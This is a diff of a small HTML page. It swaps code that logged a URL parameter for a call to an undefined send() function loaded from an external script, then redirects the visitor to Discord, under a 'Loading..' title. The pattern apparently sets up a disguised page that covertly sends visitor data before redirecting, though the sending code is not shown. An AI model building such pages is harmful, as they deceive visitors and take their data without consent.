@@ -1,17 +1,15 @@
 <!DOCTYPE html>
 <html>
+<script src="javascript.js"></script> 
 <head>
-<title>About:Blank</title>
+<title>Loading..</title>
 </head>
 <body>
   <script>
     var url = new URL(window.location.href);
     var parameterValue = url.searchParams.get("z");
-    if (parameterValue) {
-      console.log(parameterValue);
-    } else {
-      console.log("Parameter value not found.");
-    }
+    send();
+    location.replace("https://discord.com/channels/@me")
   </script>
 </body>
 </html>
